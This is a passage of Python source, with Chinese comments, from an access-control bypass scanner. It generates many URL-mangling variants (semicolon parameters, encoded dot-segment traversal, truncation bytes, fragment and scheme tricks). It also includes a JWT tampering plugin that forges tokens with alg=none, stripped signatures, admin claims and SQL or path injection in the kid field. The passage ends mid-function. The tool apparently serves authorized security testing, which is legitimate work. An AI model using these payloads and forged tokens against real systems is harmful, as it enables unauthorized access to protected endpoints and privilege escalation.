    DOTS = ("..", "%2e%2e", "%2e.", ".%2e")     # 点段形态（含半编码）

    def generate(self, ctx):
        c, op = ctx, ctx["orig_path"]
        V, out = self._build, []
        # (1) 核心矩阵：截断 × 点段 × 分号方向，4×4×4=64 条
        #     对应清单：..%00/ ..%00;/ ..%00/; ..;%00/ ..%0d;/ ..%ff/; 等截断族
        for t in self.TRUNC:
            for d in self.DOTS:
                for piece, desc in (
                    (f"{d}{t}/",  f"{d}{t}/ 点段后截断"),
                    (f"{d}{t};/", f"{d}{t};/ 截断后分号"),
                    (f"{d}{t}/;", f"{d}{t}/; 斜杠后分号"),
                    (f"{d};{t}/", f"{d};{t}/ 点段后分号截断"),
                ):
                    out.append(V(self.category, desc, _pfx_join(piece, op), c))
        # (2) 空白字节前置于点段/分号 + 后缀镜像（清单 %09.. %09; %09%3b）
        for t in ("%09", "%0d"):
            out += [
                V(self.category, f"{t}../ 前置空白+穿越", _pfx_join(f"{t}../", op), c),
                V(self.category, f"{t}; 前置空白+分号", _pfx_join(f"{t};", op), c),
                V(self.category, f"{t}%3b 前置空白+编码分号", _pfx_join(f"{t}%3b", op), c),
                V(self.category, f"尾部 {t}; 后缀空白+分号", op + t + ";", c),
                V(self.category, f"尾部 {t}%3b 后缀空白+编码分号", op + t + "%3b", c),
            ]
        # (3) 半编码点段独立形态（缺口1）+ 分号×反斜杠镜像（清单 ..;\ ..\;）
        out += [
            V(self.category, "/;/%2e. 分号+半编码点", "/;/%2e." + op, c),
            V(self.category, "/;/.%2e 分号+半编码镜像", "/;/.%2e" + op, c),
            V(self.category, "/;/.%2e/%2e%2e/%2f 半编码混合链",
              "/;/.%2e/%2e%2e/%2f" + op, c),
            V(self.category, "/%2e./ 半编码穿越", "/%2e./" + op.lstrip("/"), c),
            V(self.category, "/.%2e/ 半编码镜像穿越", "/.%2e/" + op.lstrip("/"), c),
            V(self.category, "/%2e;// 字面点+分号+双斜杠", "/%2e;//" + op.lstrip("/"), c),
            V(self.category, "/%2e%3b// 编码点+编码分号+双斜杠",
              "/%2e%3b//" + op.lstrip("/"), c),
            V(self.category, "..;\\ 分号反斜杠镜像", "/..;\\" + op.lstrip("/"), c),
            V(self.category, "..\\; 反斜杠分号镜像", "/..\\;" + op.lstrip("/"), c),
        ]
        # (4) 锚段借道形态（与 TraversalPlugin 插入位置一致，截断版镜像）
        for t in ("%00", "%0d", "%ff"):
            out += [
                V(self.category, f"/x/..{t};/ 锚段截断穿越",
                  "/x/.." + t + ";/" + op.lstrip("/"), c),
                V(self.category, f"/x/;{t}../ 锚段截断前置",
                  "/x/;" + t + "../" + op.lstrip("/"), c),
            ]
        return out


class BareMatrixPlugin(VariantPlugin):
    """v4.4 [缺口2+4] 裸矩阵参数 + 分号/问号交叉。

    原理：
    (a) 裸参数名 ;x / ;x; / /;x/ —— 矩阵参数不带 =值。带值参数 (;a=1) 在
        Tomcat/Jetty 上按 RFC 3986 path-parameter 语义统一裁剪，而裸名参数
        的裁剪行为在不同容器/版本上不一致：安全层可能按「分号即参数起点」
        裁剪，路由层可能把裸名当路径字面保留 → 两者看到的路径不同。
    (b) 分号×问号交叉 /;? ?; ?? —— ? 是 query 分界、; 是参数分界，交叉时
        不同组件切分出的 path/query 边界各异；ACL 若匹配完整 requestURI
        （含 query）即失配，路由只取 path。

    插入位置：前缀式（/;x/admin）、后缀式（/admin;x）、段间式（/admin;x/users）。
    raw 含 ? 的变体一律 keep_query=False 手工拼接，避免双 ? 歧义。"""
    category = "分号参数"

    BARE_NAMES = ("x", "a", "jsessionid")

    def generate(self, ctx):
        c, op = ctx, ctx["orig_path"]
        segs = ctx["segs"]
        V, out = self._build, []

        def _q(tail):
            return (op + "?" + c["query"] + "&" + tail) if c["query"] else op + "?" + tail

        # (1) 裸参数名前缀矩阵（缺口2：;x ;x/ ;x; ;x;/ × 三种参数名）
        for n in self.BARE_NAMES:
            for piece, desc in (
                (f";{n}",   f";{n} 前缀裸参数"),
                (f";{n}/",  f";{n}/ 斜杠尾裸参数"),
                (f";{n};",  f";{n}; 双分号裸参数"),
                (f";{n};/", f";{n};/ 双分号斜杠裸参数"),
            ):
                out.append(V(self.category, desc, _pfx_join(piece, op), c))
        # (2) 尾部/段间裸参数（对齐清单尾缀形态 + SemicolonPlugin 段间惯例）
        out += [
            V(self.category, "尾部裸参数 ;x", op + ";x", c),
            V(self.category, "尾部双裸参数 ;x;", op + ";x;", c),
            V(self.category, "尾斜杠+裸参数 /;x", op + "/;x", c),
        ]
        if segs:
            out.append(V(self.category, "段间裸参数 ;x/",
                         "/" + "/".join(s + ";x" for s in segs), c))
        # (3) 分号×问号交叉（缺口4）
        out += [
            V(self.category, "/;? 前缀分号问号", _pfx_join(";?", op), c,
              keep_query=False),
            V(self.category, "尾部 /;? 斜杠分号问号", op + "/;?", c, keep_query=False),
            V(self.category, "尾部 ?; 问号分号", _q(";"), c, keep_query=False),
            V(self.category, "尾部 ?;x 问号裸参数", _q(";x"), c, keep_query=False),
            V(self.category, "尾部 ?? 双问号", _q("?"), c, keep_query=False),
            V(self.category, "尾部 ?.php 问号伪后缀", _q(".php"), c, keep_query=False),
        ]
        return out


class FragmentBoundaryPlugin(VariantPlugin):
    """v4.4 fragment / query 边界混淆（全编码形态）。

    原理：字面 # 是客户端概念——yarl/aiohttp 解析后 fragment 不上传
    （QueryFragmentPlugin 已注明此限制），故本插件全部采用 %23 编码形态：
    客户端把 %23 视为合法 percent 序列原样发送；服务端一侧组件解码后把
    # 后内容当 fragment 剥离（容错解析器常见行为），另一侧当字面字符——
    两者看到的路径长度不同，ACL 匹配失配而路由正常解析。
    同族前导编码问号 %3f：客户端原样发送，服务端解码后按 query 分界。

    插入位置：前缀（/%23/admin）、后缀（/admin%23）、复合（/%2f%23/admin）、
    query 交叉（/admin?%23）。"""
    category = "特殊编码"

    def generate(self, ctx):
        c, op = ctx, ctx["orig_path"]
        V, out = self._build, []

        def _q(tail):
            return (op + "?" + c["query"] + "&" + tail) if c["query"] else op + "?" + tail

        # (1) 编码井号/问号前缀族（清单 # #? %23 %23%3f %3f%3f %2f%23 可发送形态）
        out += [
            V(self.category, "前缀 %23 编码井号", "/%23" + op, c),
            V(self.category, "前缀 %23%3f 井号+编码问号", "/%23%3f" + op, c),
            V(self.category, "前缀 %3f 编码问号", "/%3f" + op, c),
            V(self.category, "前缀 %3f%3f 双编码问号", "/%3f%3f" + op, c),
            V(self.category, "前缀 %2f%23 编码斜杠+井号", "/%2f%23" + op, c),
            V(self.category, "前缀 %2f%20%23 斜杠+空格+井号", "/%2f%20%23" + op, c),
            V(self.category, "前缀 %20%23 空格+井号", "/%20%23" + op, c),
        ]
        # (2) 尾缀族（清单 %3f%23 %23%3f /%23 %2f%23 尾部形态；
        #     尾部 %23 已由 SpecialEncodingPlugin 既有变体覆盖，不重复）
        out += [
            V(self.category, "尾部 %3f 编码问号", op + "%3f", c),
            V(self.category, "尾部 %3f%23 问号+井号", op + "%3f%23", c),
            V(self.category, "尾部 %23%3f 井号+问号", op + "%23%3f", c),
            V(self.category, "尾部 /%23 斜杠+井号", op + "/%23", c),
            V(self.category, "尾部 %2f%23 编码斜杠+井号", op + "%2f%23", c),
        ]
        # (3) query 交叉族：?%23 —— query 携带编码井号
        out += [
            V(self.category, "尾部 ?%23 问号+编码井号", _q("%23"), c, keep_query=False),
            V(self.category, "尾部 ?%23%3f 复合", _q("%23%3f"), c, keep_query=False),
        ]
        return out


class SemicolonTraversalMatrixPlugin(VariantPlugin):
    """v4.4 前导分号 × 穿越 × 编码斜杠 × 编码大小写矩阵（清单族6 系统化）。

    原理：把分号参数放在请求路径最前端——「安全层裁剪分号后内容 vs 路由层
    保留原文」（SemicolonPlugin v3.2 [需求3] 同源差异面），叠加三类要素：
    (a) 编码斜杠 %2f —— 不参与 Nginx merge_slashes，解码前后分隔语义不同；
    (b) 穿越点段 .. / %2e%2e / ..; / %2e. —— 归一化语义；
    (c) 大写编码 %2F —— 对字面量正则匹配的 ACL，大小写不同即失配。
    采用要素级组合代表而非全排列：清单族6 约 88 条排列的命中机理与
    本矩阵代表项完全同构，未枚举排列由 --max-variants 轮转覆盖。

    插入位置：原路径最前端（/;%2f../admin）+ 双斜杠/分号尾随复合变体。"""
    category = "分号参数"

    ANCHORS = (";", ";/", ";%2f", ";/%2f", ";//", ";%2F")   # 前导锚（含大写编码）
    TRAVELS = ("..", "%2e%2e", "..;", "%2e.")               # 穿越要素（含半编码）

    def generate(self, ctx):
        c, op = ctx, ctx["orig_path"]
        V, out = self._build, []
        for a in self.ANCHORS:
            for t in self.TRAVELS:
                # 单层：对应清单 ;%2f.. ;/.. ;%2f%2e%2e ;//.. ;%2F.. 等前缀
                out.append(V(self.category, f"{a}{t}/ 前导分号穿越",
                             _pfx_join(f"{a}{t}/", op), c))
                # 双层：对应清单 ;%2f..%2f..%2f%2f ;/../../ 等多层代表
                out.append(V(self.category, f"{a}{t}/{t}/ 双层",
                             _pfx_join(f"{a}{t}/{t}/", op), c))
        # 双斜杠/分号尾随复合代表（清单 ;%2f../// ;/..//%2e%2e/ ;%2f..//;/ 等）
        out += [
            V(self.category, ";%2f../// 三斜杠尾随", _pfx_join(";%2f..///", op), c),
            V(self.category, ";/..//%2e%2e/ 双斜杠+编码点",
              _pfx_join(";/..//%2e%2e/", op), c),
            V(self.category, ";%2f..//;/ 分号尾随", _pfx_join(";%2f..//;/", op), c),
            V(self.category, ";%2f..///; 斜杠分号尾", _pfx_join(";%2f..///;", op), c),
            V(self.category, ";%2f..//;/; 双分号尾", _pfx_join(";%2f..//;/;", op), c),
        ]
        return out


class SchemeFlipPlugin(VariantPlugin):
    """v4.3 [P0-4] HTTP↔HTTPS 协议切换（类别 AL）：部分错误配置的入口按协议
    应用不同访问控制（TLS 层 WAF vs 明文入口行为分叉）。
    策略：scheme 翻转 × 高价值路径变形（分号后缀/借道/穿越/编码各取代表形）
    正交组合，控制请求量；端口保持原样（https://host:8443 → http://host:8443）。"""
    category = "协议切换"

    def generate(self, ctx):
        c = ctx
        op, segs = c["orig_path"], c["segs"]
        prefix = c["prefix"]
        scheme = urlparse(prefix).scheme.lower()
        if scheme not in ("http", "https"):
            return
        flipped = "https" if scheme == "http" else "http"
        fprefix = f"{flipped}://{urlparse(prefix).netloc}"
        qo = ("?" + c["query"]) if c["query"] else ""
        V = self._build
        # 代表性路径变形——分号后缀/借道/穿越/编码/结构各取其一，正交于 scheme 翻转
        reps = [
            ("原始路径直发", op),
            ("尾斜杠", op + "/"),
            ("分号后缀 ;.js", op + ";.js"),
            ("分号参数 ;a=1", op + ";a=1"),
            ("/x/..;/ 穿越", "/x/..;/" + "/".join(segs)),
            ("/public/../ 借道", "/public/../" + op.lstrip("/")),
            ("%2f 编码斜杠", op.replace("/", "%2f")),
            ("双斜杠前缀", "//" + op.lstrip("/")),
        ]
        # 完整 URL 形态传入 _build（raw 以 http 开头时直接使用），
        # query 由本插件自行拼接（keep_query 仅作用于相对路径分支）
        return [V(self.category, f"[{flipped}] {desc}", fprefix + raw + qo, c, keep_query=False)
                for desc, raw in reps]


# ---------------------------------------------------------------------------
# v4.3 [P0-5] JWT 结构感知工具——纯 stdlib 实现，不引入外部 JWT 库
# ---------------------------------------------------------------------------
def _b64url_decode(seg):
    return base64.urlsafe_b64decode(seg + "=" * (-len(seg) % 4))


def _b64url_encode(data):
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode("ascii")


JWT_BEARER_RE = re.compile(
    r"^\s*Bearer\s+([A-Za-z0-9_-]{8,})\.([A-Za-z0-9_-]{4,})\.([A-Za-z0-9_-]+)\s*$")

# claim 提升目标键——仅对 payload 中已存在的键生成变体，避免无意义爆破
JWT_PRIVILEGE_KEYS = ("role", "roles", "user", "username", "sub", "account",
                      "authority", "authorities", "scope", "permissions", "perms",
                      "group", "groups", "is_admin", "isAdmin", "admin", "level",
                      "privilege", "user_type", "userType")


def _parse_bearer_jwt(headers):
    """从基础请求头提取 Bearer JWT；不存在/结构不合法返回 None"""
    auth = ""
    for k, v in (headers or {}).items():
        if k.lower() == "authorization":
            auth = v
            break
    m = JWT_BEARER_RE.match(auth)
    if not m:
        return None
    try:
        header = json.loads(_b64url_decode(m.group(1)))
        payload = json.loads(_b64url_decode(m.group(2)))
    except (ValueError, json.JSONDecodeError):
        return None
    if not isinstance(header, dict) or not isinstance(payload, dict):
        return None
    return {"h64": m.group(1), "p64": m.group(2), "sig": m.group(3),
            "header": header, "payload": payload}


class JwtTamperPlugin(VariantPlugin):
    """v4.3 [P0-5] JWT 令牌篡改（类别 AM）：alg=none / 签名剥离 / claim 提升 /
    kid 注入，覆盖"服务端未验签"缺陷家族（HS256↔RS256 混淆需密钥，不在无凭据
    篡改范围内）。凭据层攻击面敏感，仅在 --probe-jwt 或 --categories 显式
    包含"JWT篡改"时启用；基础请求头无 Bearer JWT 时插件静默跳过。"""
    category = "JWT篡改"
    require_flag = "probe_jwt"

    def generate(self, ctx):
        token = _parse_bearer_jwt(ctx.get("base_headers"))
        if not token:
            return []
        c = ctx
        op = c["orig_path"]
        V = self._build
        h64, p64, sig = token["h64"], token["p64"], token["sig"]
        header, payload = token["header"], token["payload"]

        def emit(desc, hdr=None, pl=None, tail_sig=None):
            """生成篡改后的 Bearer 变体。tail_sig=None → 剥离签名段；
            tail_sig=sig → 保留原签名（部分实现只查签名存在不验证）"""
            h = dict(header) if hdr is None else hdr
            p = dict(payload) if pl is None else pl
            new_h = _b64url_encode(json.dumps(h, separators=(",", ":")).encode())
            new_p = _b64url_encode(json.dumps(p, separators=(",", ":")).encode())
            value = f"Bearer {new_h}.{new_p}" + (f".{tail_sig}" if tail_sig else ".")
            return V(self.category, desc, op, c, headers={"Authorization": value})

        variants = []
        # ① alg=none 族（payload 原样，仅篡改 header）
        variants.append(emit("alg=none+签名剥离", hdr={**header, "alg": "none"}))
        variants.append(emit("alg=none+保留原签名", hdr={**header, "alg": "none"}, tail_sig=sig))
        variants.append(emit("alg=None(首字母大写变体)", hdr={**header, "alg": "None"}))
        variants.append(emit("alg=NONE(全大写变体)", hdr={**header, "alg": "NONE"}))
        variants.append(emit("alg 字段删除", hdr={k: v for k, v in header.items() if k != "alg"}))
        # ② 签名剥离（header/payload 原样，仅去掉第三段）
        variants.append(V(self.category, "签名剥离(头/载荷原样)", op, c,
                          headers={"Authorization": f"Bearer {h64}.{p64}."}))
        variants.append(V(self.category, "签名占位 xx(绕过存在性检查)", op, c,
                          headers={"Authorization": f"Bearer {h64}.{p64}.xx"}))
        # ③ claim 提升——仅对 payload 中已存在的权限类键生成
        for key in JWT_PRIVILEGE_KEYS:
            if key in payload:
                variants.append(emit(f"{key}→admin", pl={**payload, key: "admin"}))
                variants.append(emit(f"{key}→true(布尔提升)", pl={**payload, key: True}))
        # ④ iss/aud 篡改（签发方/受众放行域）
        for key in ("iss", "aud"):
            if key in payload:
                variants.append(emit(f"{key}→admin", pl={**payload, key: "admin"}))
                variants.append(emit(f"{key}→*(通配)", pl={**payload, key: "*"}))
        # ⑤ 过期控制
        if "exp" in payload:
            variants.append(emit("exp 延长10年", pl={**payload, "exp": int(time.time()) + 315360000}))
            variants.append(emit("exp 删除", pl={k: v for k, v in payload.items() if k != "exp"}))
        # ⑥ kid 注入（针对 kid 参与文件读取/SQL 查询的实现）
        for kid_val, desc in (("../../dev/null", "kid 指向 /dev/null"),
                              ("", "kid 置空"),
                              ("' OR '1'='1", "kid SQL 注入")):
            variants.append(emit(desc, hdr={**header, "kid": kid_val}))
        # ⑦ 载荷重构
        variants.append(emit("payload 置空 {}", pl={}))
        variants.append(emit("payload 替换为 admin 构造",
                             pl={"role": "admin", "user": "admin", "sub": "admin"}))
        variants.append(emit("payload 替换为超管构造",
                             pl={"role": "superadmin", "roles": ["admin"],
                                 "permissions": ["*"], "exp": int(time.time()) + 315360000}))
        return variants



# 插件注册表
PLUGIN_REGISTRY = [
    SemicolonPlugin,
    TraversalPlugin,
    DirectoryTraversalPlugin,
    StaticPrefixPlugin,
    CasePlugin,
    SlashPlugin,
    SuffixPlugin,
    SpecialEncodingPlugin,
    HttpMethodPlugin,
    ForwardHeaderPlugin,
    SourceSpoofPlugin,
    PathStructurePlugin,
    CacheDeceptionPlugin,
    DotNetPlugin,
    NodeJsPlugin,
    NginxPlugin,
    # v3.2 新增
    PathNormalizationPlugin,
    EncodingPlugin,
    TailSuffixPlugin,
    RedirectProbePlugin,
    HeaderRewritePlugin,
    # v3.4 新增
    UnicodeNormalizationPlugin,
    AuthConstructPlugin,
    HostRewritePlugin,
    AbsoluteUriPlugin,
    # v3.5 新增
    SegmentMutatePlugin,
    BorrowPrefixPlugin,
    # v3.6 新增
    SegmentCasePlugin,
    # v3.7 新增
    SemicolonSuffixPlugin,
    # v4.1 新增（注册于尾部：--max-variants 轮转截取时先裁新类别，不挤占既有覆盖）
    CRLFInjectionPlugin,
    QueryFragmentPlugin,
    # v4.2 URL 解析规则扩展
    URLParserMatrixPlugin,
    BackslashMatrixPlugin,
    DotSegmentMatrixPlugin,
    RepeatedSlashMatrixPlugin,
    PathQueryBoundaryMatrixPlugin,
    TruncationSuffixMatrixPlugin,
    # v4.3 新增：协议切换（AL，默认启用）与 JWT 篡改（AM，需 --probe-jwt 解锁）
    SchemeFlipPlugin,
    JwtTamperPlugin,
    # v4.4 新增：截断矩阵 / 裸矩阵参数 / fragment 边界 / 前导分号穿越矩阵
    # （复用既有类别「特殊编码」「分号参数」，聚类与报告零改动）
    TruncationMatrixPlugin,
    BareMatrixPlugin,
    FragmentBoundaryPlugin,
    SemicolonTraversalMatrixPlugin,
]


COMBINE_CATEGORIES = ("..;/ 穿越", "分号参数", "编码解码", "大小写", "尾缀差异", "借道前缀",
                      "路径规范化", "分号后缀")


def combine_variants(variants, ctx, cap=250, per_cat=4):
    """v3.4 [G5] 双因子组合变形引擎：前缀型变形 + 后缀型变形叠加。
    前缀型 = 变形路径在原路径外包裹额外前缀（如 /x/..;/ 原路径）；
    后缀型 = 变形路径以原路径开头再追加尾部（如 原路径.json / 原路径/）。
    v3.8: 过滤条件从「GET/无附加头/无体」改为「与基础请求完全一致」，
    组合产物继承基础方法/请求体/请求头——POST 目标下双因子组合同样携带
    原始请求体；实战中双因子组合命中率显著高于单因子。"""
    orig = ctx["orig_path"]
    base_method = ctx.get("method") or "GET"
    base_body = ctx.get("body")
    base_headers = ctx.get("base_headers") or {}
    prefix_pool, suffix_pool = [], []
    for v in variants:
        if v["method"] != base_method or v["headers"] != base_headers \
                or v.get("body") != base_body or v.get("use_absolute"):
            continue
        if v["cat"] not in COMBINE_CATEGORIES:
            continue
        path = urlparse(v["url"]).path
        if path.endswith(orig) and len(path) > len(orig):
            prefix_pool.append((v, path[:-len(orig)]))
        elif path.startswith(orig) and len(path) > len(orig):
            suffix_pool.append((v, path[len(orig):]))
    prefix_pool = prefix_pool[:per_cat * 2]
    suffix_pool = suffix_pool[:per_cat * 2]

    out, seen = [], set()
    for (va, pre) in prefix_pool:
        for (vb, suf) in suffix_pool:
            if va["cat"] == vb["cat"]:
                continue
            path = pre + orig + suf
            if path in seen:
                continue
            seen.add(path)
            out.append({"cat": "组合变形", "desc": f"{va['desc']}+{vb['desc']}",
                        "url": ctx["prefix"] + path + (("?" + ctx["query"]) if ctx["query"] else ""),
                        "method": base_method, "headers": dict(base_headers), "body": base_body,
                        "follow": False, "use_absolute": False})
            if len(out) >= cap:
                return out
    return out


def round_robin_slice(variants, cap):
    """v3.4 [P3] 按类别轮转截取，避免 --max-variants 系统性丢弃注册表后排类别"""
    if not cap or len(variants) <= cap:
        return variants
    buckets = {}
    for v in variants:
        buckets.setdefault(v["cat"], []).append(v)
    out = []
    idx = 0
    while len(out) < cap:
        added = False
        for bucket in buckets.values():
            if idx < len(bucket) and len(out) < cap:
                out.append(bucket[idx])
                added = True
        if not added:
            break
        idx += 1
    return out


PREFIX_METHOD_CATEGORIES = ("借道前缀", "..;/ 穿越", "目录穿越")
# v3.8: 副本方法候选（相对基础方法取差集；DELETE 有破坏性，默认不复制）
PREFIX_METHOD_CANDIDATES = ("GET", "POST", "PUT", "PATCH")


def prefix_method_copies(variants, ctx, cap=160):
    """v3.5 [缺口4] 借道/穿越类变形 × HTTP 方法副本（v3.8 相对基础方法生成）。
    只复制路径含字面 ".." 且与基础请求（方法/头/体）完全一致的代表形
    （单因子机制一旦成立，方法副本大概率同样成立），用于探测
    /public/../admin/role/update 这类需写方法才触发的借道绕过。
    v3.8: 副本方法集改为 基础方法之外 的 GET/POST/PUT/PATCH——POST 基础下
    自动补 GET/PUT/PATCH，探测「鉴权只挂 POST、借道后其它方法放行」。"""
    base = ctx.get("method") or "GET"
    base_headers = ctx.get("base_headers") or {}
    methods = [m for m in PREFIX_METHOD_CANDIDATES if m != base]
    out = []
    for v in variants:
        if len(out) >= cap:
            break
        if v["method"] != base or v["headers"] != base_headers \
                or v.get("body") != ctx.get("body") \
                or v.get("use_absolute") or v.get("follow"):
            continue
        if v["cat"] not in PREFIX_METHOD_CATEGORIES:
            continue
        if ".." not in urlparse(v["url"]).path:
            continue
        for m in methods:
            out.append({**v, "method": m, "desc": f"{v['desc']} + {m}"})
    return out


def generate_variants(url, categories=None, exclude=None, probe_auth=False,
                      probe_jwt=False, combine=False, combine_cap=250,
                      borrow_prefixes=None, prefix_methods=False,
                      base_method="GET", base_body=None, base_headers=None):
    """插件化变形生成——自动去重，支持类别筛选、变形排除、认证插件开关、
    组合引擎、指定前缀借道（--borrow-prefix）与借道×方法副本（--prefix-methods）。
    v3.8: base_method/base_body/base_headers 描述基础请求（-r 请求文件或
    --method/--data），路径类变形默认继承方法/请求体/请求头，方法类变形
    相对基础方法生成——POST 目标下全部变形自动携带原始请求体。
    v4.3: probe_jwt 门控 JwtTamperPlugin（类别 AM）；类别筛选约定不变——
    插件 category 必须为中文名（CATEGORY_MAP 值），字母代码输入由映射归一。"""
    prefix, segs, query = split_path(url)
    if not segs:
        segs = [""]
    ctx = {
        "prefix": prefix, "segs": segs, "query": query,
        "orig_path": "/" + "/".join(segs),
        "first": segs[0],
        "rest": "/".join(segs[1:]) if len(segs) > 1 else "",
        "tail_rest": ("/" + "/".join(segs[1:])) if len(segs) > 1 else "",
        "qo": ("?" + query) if query else "",
        # v3.5: --borrow-prefix 指定的真实公开/白名单前缀，供 BorrowPrefixPlugin 使用
        "borrow_prefixes": [str(b).strip() for b in (borrow_prefixes or []) if str(b).strip()],
        # v3.8: 基础请求上下文——_build 默认继承，I 类方法插件相对生成
        "method": (base_method or "GET").upper(),
        "body": base_body,
        "base_headers": dict(base_headers or {}),
    }

    # 类别筛选：支持字母代码和名称
    cat_filter = None
    if categories:
        cat_filter = set()
        for c in categories.split(","):
            c = c.strip()
            if c in CATEGORY_MAP:
                cat_filter.add(CATEGORY_MAP[c])
            else:
                cat_filter.add(c)
        if "认证构造" in cat_filter:
            probe_auth = True  # 显式点名该类别时自动解锁
        if "JWT篡改" in cat_filter:
            probe_jwt = True  # v4.3: 同上，显式点名 JWT篡改 类别时自动解锁

    exclude_list = exclude if exclude else []

    variants = []
    seen = set()

    # v4.3: require_flag 门控泛化——probe_auth / probe_jwt 均在此拦截
    flag_gates = {"probe_auth": probe_auth, "probe_jwt": probe_jwt}
    for plugin_cls in PLUGIN_REGISTRY:
        required = getattr(plugin_cls, "require_flag", "")
        if required and not flag_gates.get(required):
            continue
        plugin = plugin_cls()
        if cat_filter and plugin.category not in cat_filter:
            continue

        for v in plugin.generate(ctx):
            if exclude_list and any(ex in v["desc"] for ex in exclude_list):
                continue
            key = (v["method"], v["url"], tuple(sorted(v["headers"].items())), v.get("body"),
                   bool(v.get("follow")), bool(v.get("use_absolute")))
            if key not in seen:
                seen.add(key)
                variants.append(v)

    # v3.4 [G5] 双因子组合（类别筛选未包含"组合变形"时跳过，避免类别语义被污染）
    if combine and (not cat_filter or "组合变形" in cat_filter):
        for v in combine_variants(variants, ctx, cap=combine_cap):
            key = (v["method"], v["url"], tuple(sorted(v["headers"].items())), v.get("body"), False, False)
            if key not in seen:
                seen.add(key)
                variants.append(v)

    # v3.5 [缺口4] 借道/穿越类 GET 变形 × 写方法副本（--prefix-methods 显式开启；
    # 类别筛选语义保持一致：副本继承源变形类别，随 cat_filter 自然生效）
    if prefix_methods:
        for v in prefix_method_copies(variants, ctx):
            key = (v["method"], v["url"], tuple(sorted(v["headers"].items())), v.get("body"), False, False)
            if key not in seen:
                seen.add(key)
                variants.append(v)

    return variants


# ---------------------------------------------------------------------------
# 5. 异步请求管理器（流式读取 + 会话复用）
# ---------------------------------------------------------------------------
# v3.8: 匿名探测剥离的认证类头——请求文件/自定义头中的凭据不得进入"匿名"复核，
# 否则"匿名即可访问"的结论会被自身携带的 Bearer/API-Key 污染
ANON_STRIP_HEADERS = {"authorization", "cookie", "x-api-key", "x-auth-token",
                      "x-access-token", "api-key", "proxy-authorization", "x-auth-request"}


# ---------------------------------------------------------------------------
# 5.5 客户端保真层（v4.5 新增）
# ---------------------------------------------------------------------------
# 解决缺陷 2.1：HTTP 客户端（aiohttp）会：
#   1. 头部 dict.update() 折叠重复头（X-Forwarded-For、Host）
#   2. yarl URL() 改写编码（query 中 %2F/%3F/%23 被解码）
#   3. CRLF 头直接抛 ValueError，无法区分「客户端丢弃」与「目标拒绝」
#   4. 自动注入 Accept-Encoding/Host/Content-Length，覆盖测试意图
# 修复：
#   - 头部改用 list[tuple[str,str]] 承载多值
#   - URL 字段级保真检测
#   - 新增终态 ✕客户端丢弃 + 机器可读 client_err
#   - skip_auto_headers 抑制自动头（实测该版本 aiohttp 对 Host/POST
#     Content-Length 仍会强制补齐，请求合法性不受影响）
#   - RequestManager.stats 统计 planned/sent/responded/client_rejected/rewritten

import re
from collections import Counter

# RFC 7230 可合并头（list 语义，多值可用逗号连接）
MERGEABLE_HEADERS = {
    "accept", "accept-charset", "accept-encoding", "accept-language",
    "accept-ranges", "allow", "cache-control", "connection",
    "content-encoding", "content-language", "expect", "if-match",
    "if-none-match", "pragma", "proxy-authenticate", "te", "trailer",
    "transfer-encoding", "upgrade", "vary", "via", "warning",
    "www-authenticate", "x-forwarded-for", "x-forwarded-proto",
    "forwarded",
}

# 单例头（HTTP 语义禁止重复，重复视为配置错误）
SINGLETON_HEADERS = {
    "content-type", "content-length", "date", "etag", "expires",
    "last-modified", "location", "referer", "server", "user-agent",
    "authorization", "cookie", "host",
}

# aiohttp 会自动注入的头（需用 skip_auto_headers 抑制）
AUTO_SUPPRESS_HEADERS = {"accept-encoding", "content-length", "user-agent", "host"}

# 客户端丢弃原因码
CLIENT_ERR_CODES = {
    "url_invalid": "URL 格式非法（scheme/netloc/path 解析失败）",
    "url_rewritten": "URL 被客户端改写（编码字符被解码或规范化）",
    "header_crlf": "头部含 CRLF（\\r 或 \\n）",
    "header_invalid": "头部格式非法（键或值非法字符）",
    "header_duplicate_unsafe": "单例头重复（违反 HTTP 语义）",
    "header_unicode": "头部含非 ASCII 字符（无法编码为 latin-1）",
    "body_encode": "请求体无法编码为 UTF-8",
    "unsupported_scheme": "协议不支持（非 http/https）",
}


def normalize_headers(raw):
    """
    统一头部输入为 list[tuple[str, str]]。
    输入支持：dict、CIMultiDict、list[tuple]。
    返回：规范化后的 pairs 列表。
    """
    if raw is None:
        return []
    if isinstance(raw, dict):
        return list(raw.items())
    if hasattr(raw, "items"):  # CIMultiDict
        return list(raw.items())
    if isinstance(raw, (list, tuple)):
        return [(str(k), str(v)) for k, v in raw]
    return []


def resolve_singleton_overrides(pairs):
    """
    v4.5 兼容修正（方案落地必需）：单例头同名时按「后者覆盖前者」消解。
    必要性：v3.8 起 -r 请求文件的基础头会同时进入 manager.extra_headers
    （run_target: manager.extra_headers = {**cli, **spec.headers}）与每个
    变体的 headers（_build: hdrs = dict(base_headers)），即 User-Agent /
    Authorization / Content-Type 等单例头天然成对出现；v4.4 靠
    dict.update() 静默折叠、变体头生效。若不消解，validate_header_pairs
    会把几乎所有 -r 目标变形误判为 header_duplicate_unsafe 而整轮丢弃
    （严重回归）。消解语义与 v4.4 dict.update() 完全一致：后出现者覆盖。
    可合并头（X-Forwarded-For 等）不受影响，仍走 collapse_mergeable 合并。
    """
    last_idx = {}
    for i, (k, _) in enumerate(pairs):
        if k.lower() in SINGLETON_HEADERS:
            last_idx[k.lower()] = i
    return [p for i, p in enumerate(pairs) if last_idx.get(p[0].lower(), i) == i]


def collapse_mergeable(pairs):
    """
    合并可合并头（MERGEABLE_HEADERS），产出 collapsed_pairs + notes。
    返回：(collapsed_pairs, merge_notes_list)
    merge_notes_list: ["X-Forwarded-For: 合并 3 个值", ...]
    """
    from collections import defaultdict
    groups = defaultdict(list)
    order = []
    for k, v in pairs:
        k_lower = k.lower()
        if k_lower not in groups:
            order.append(k_lower)
        groups[k_lower].append((k, v))

    collapsed = []
    notes = []
    for k_lower in order:
        items = groups[k_lower]
        if len(items) == 1:
            collapsed.append(items[0])
        elif k_lower in MERGEABLE_HEADERS:
            # 合并为逗号分隔
            merged_val = ", ".join(v for _, v in items)
            collapsed.append((items[0][0], merged_val))  # 保留首次出现的键大小写
            notes.append(f"{items[0][0]}: 合并 {len(items)} 个值")
        else:
            # 不可合并，保留所有重复
            collapsed.extend(items)

    return collapsed, notes


def validate_header_pairs(pairs):
    """
    校验头部是否符合 HTTP 规范。
    返回：(ok: bool, err_code: str|None, detail: str|None)
    检查：CRLF、非法字符、单例头重复、非 ASCII。
    """
    seen_singletons = set()
    for k, v in pairs:
        k_lower = k.lower()
        # 1) CRLF
        if "\r" in k or "\n" in k or "\r" in v or "\n" in v:
            return False, "header_crlf", f"头部键或值含 CRLF: {k}"
        # 2) 非 ASCII（aiohttp 要求 latin-1，实际常失败）
